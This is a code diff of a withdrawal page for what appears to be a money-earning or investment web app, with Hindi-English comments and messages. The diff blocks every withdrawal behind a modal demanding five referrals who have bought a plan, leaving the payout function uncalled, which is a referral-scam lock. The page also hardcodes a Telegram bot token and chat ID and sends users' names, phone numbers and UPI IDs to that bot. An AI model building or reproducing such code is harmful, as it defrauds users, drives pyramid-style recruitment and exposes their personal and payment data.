@@ -8,17 +8,15 @@
     <style>
         :root { --bg: #f5f7ff; --card: #ffffff; --accent: #4a6cf7; --text: #333; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-        body { background: var(--bg); color: var(--text); padding: 20px; }
+        body { background: var(--bg); color: var(--text); padding: 20px; padding-bottom: 50px; }
         
         .header { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
         .back-btn { font-size: 20px; cursor: pointer; color: var(--text); }
 
-        /* Balance Section */
         .balance-display { background: #1a1a1a; color: white; padding: 30px; border-radius: 24px; text-align: center; margin-bottom: 25px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
         .balance-display p { opacity: 0.7; font-size: 13px; }
         .balance-display h1 { font-size: 38px; margin-top: 5px; }
 
-        /* Form Section */
         .withdraw-box { background: white; padding: 25px; border-radius: 24px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
         .input-group { margin-bottom: 20px; }
         .input-group label { display: block; font-size: 12px; font-weight: 600; color: #666; margin-bottom: 8px; text-transform: uppercase; }
@@ -31,9 +29,13 @@
         .info-card p { font-size: 12px; color: #795548; }
 
         .btn-withdraw { width: 100%; padding: 16px; border: none; border-radius: 15px; background: var(--accent); color: white; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 12px rgba(74, 108, 247, 0.3); }
-        .btn-withdraw:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
-
-        /* Success Message */
+        
+        /* Modal Styles */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 2000; padding: 20px; backdrop-filter: blur(5px); }
+        .ref-modal { background: white; padding: 30px; border-radius: 30px; text-align: center; max-width: 400px; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
+        .ref-icon { font-size: 50px; color: #e74c3c; margin-bottom: 15px; }
+        .ref-code-box { background: #f8faff; border: 2px dashed #4a6cf7; padding: 15px; margin: 20px 0; border-radius: 15px; }
+        
         #successBox { display: none; text-align: center; padding: 40px 20px; }
         #successBox i { font-size: 60px; color: #4caf50; margin-bottom: 20px; }
     </style>
@@ -72,6 +74,24 @@
         </div>
     </div>
 
+    <div class="modal-overlay" id="refModal">
+        <div class="ref-modal">
+            <i class="fa-solid fa-circle-exclamation ref-icon"></i>
+            <h2 style="color:#333;">Action Required!</h2>
+            <p style="color:#666; font-size: 14px; margin-top: 10px;">
+                Bhai, withdrawal unlock karne ke liye aapko kam se kam **5 Active Referrals** (jinhone plan kharida ho) karne honge.
+            </p>
+            
+            <div class="ref-code-box">
+                <p style="font-size: 12px; color: #777;">Aapka Referral Link:</p>
+                <p id="shareLink" style="font-weight: 700; color: #4a6cf7; word-break: break-all; margin-top: 5px; font-size: 13px;"></p>
+            </div>
+
+            <button class="btn-withdraw" onclick="copyRefLink()">Copy & Share Link</button>
+            <p onclick="closeRefModal()" style="margin-top: 15px; color: #999; cursor: pointer;">Abhi nahi</p>
+        </div>
+    </div>
+
     <div id="successBox">
         <i class="fa-solid fa-circle-check"></i>
         <h2>Request Received!</h2>
@@ -80,7 +100,6 @@
     </div>
 
     <script>
-        // Data Load Karo
         const balance = localStorage.getItem('userBalance') || '0';
         const upi = localStorage.getItem('userUPI') || 'Not Set';
         const name = localStorage.getItem('userName') || 'User';
@@ -92,7 +111,6 @@
         function handleWithdraw() {
             const amount = document.getElementById('amtInput').value;
 
-            // Validation
             if (upi === "Not Set") {
                 alert("Bhai, pehle profile mein jaakar UPI ID save karo!");
                 return;
@@ -106,16 +124,41 @@
                 return;
             }
 
-            // UI Change
-            document.getElementById('withdrawUI').style.display = 'none';
-            document.getElementById('successBox').style.display = 'block';
+            // Ab yahan Referral Lock Modal khulega
+            showReferralModal();
+        }
 
-            // Telegram Notification
-            const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
-            const chat_id = "8415600127";
-            const message = `💸 *WITHDRAWAL REQUEST*\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₹${amount}\n💳 UPI ID: ${upi}\n🕒 Time: ${new Date().toLocaleString()}`;
+        function showReferralModal() {
+            // Referral link generate karna (GitHub URL ke hisaab se)
+            const refLink = window.location.origin + "/index.html?ref=" + phone;
+            document.getElementById('shareLink').innerText = refLink;
+            document.getElementById('refModal').style.display = 'flex';
+        }
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+        function copyRefLink() {
+            const link = document.getElementById('shareLink').innerText;
+            navigator.clipboard.writeText(link).then(() => {
+                alert("Referral Link Copy Ho Gaya! Ab 5 active dosto ko bhejo.");
+            });
+        }
+
+        function closeRefModal() {
+            document.getElementById('refModal').style.display = 'none';
+        }
+
+        // Ye function tabhi chalana jab aapko admin panel se manually approve karna ho
+        // Ya fir future mein agar aap automatic 5 ref check lagao
+        function finalizeWithdrawal() {
+             const amount = document.getElementById('amtInput').value;
+             document.getElementById('withdrawUI').style.display = 'none';
+             document.getElementById('refModal').style.display = 'none';
+             document.getElementById('successBox').style.display = 'block';
+
+             const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
+             const chat_id = "8415600127";
+             const message = `💸 *WITHDRAWAL REQUEST*\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₹${amount}\n💳 UPI ID: ${upi}`;
+
+             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
         }
     </script>
 </body>
